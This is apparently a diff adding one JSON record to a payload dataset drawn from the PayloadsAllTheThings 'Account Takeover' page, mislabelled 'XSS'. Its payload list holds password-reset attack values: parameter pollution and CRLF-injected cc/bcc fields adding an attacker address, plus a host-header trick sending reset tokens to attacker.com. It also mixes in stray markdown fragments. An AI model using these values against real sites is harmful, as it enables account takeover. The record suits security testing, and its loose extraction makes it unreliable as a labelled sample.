@@ -1,0 +1,27 @@
+{
+  "id": "xss-f36627870422",
+  "category": "XSS",
+  "title": "README",
+  "description": "# Account Takeover\n\n> Account Takeover (ATO) is a significant threat in the cybersecurity landscape, involving unauthorized access to users' accounts through various attack vectors.\n\n## Summary\n\n* [Password Reset Feature](#password-reset-feature)\n    * [Password Reset Token Leak via Referrer](#password-reset-token-leak-via-referrer)\n    * [Account Takeover Through Password Reset Poisoning](#account-takeover-through-password-reset-poisoning)\n    * [Password Reset via Email Parameter](#password-re",
+  "payloads": [
+    "* [Account Takeover via HTTP Request Smuggling](#account-takeover-via-http-request-smuggling)",
+    "```http",
+    "POST https://example.com/reset.php HTTP/1.1",
+    "4. Look for a password reset URL based on the *host header* like : `https://attacker.com/reset-password.php?token=TOKEN`",
+    "email=victim@mail.com&email=hacker@mail.com",
+    "{\"email\":[\"victim@mail.com\",\"hacker@mail.com\"]}",
+    "email=victim@mail.com%0A%0Dcc:hacker@mail.com",
+    "email=victim@mail.com%0A%0Dbcc:hacker@mail.com",
+    "email=victim@mail.com,hacker@mail.com",
+    "email=victim@mail.com%20hacker@mail.com",
+    "email=victim@mail.com|hacker@mail.com",
+    "(\"form\": {\"email\":\"victim@email.com\",\"password\":\"securepwd\"})",
+    "* Small token sequence (<6 characters between [A-Z,a-z,0-9])",
+    "1. Trigger a password reset request using the API/UI for a specific email e.g: <test@mail.com>",
+    "3. Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Account Takeover/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
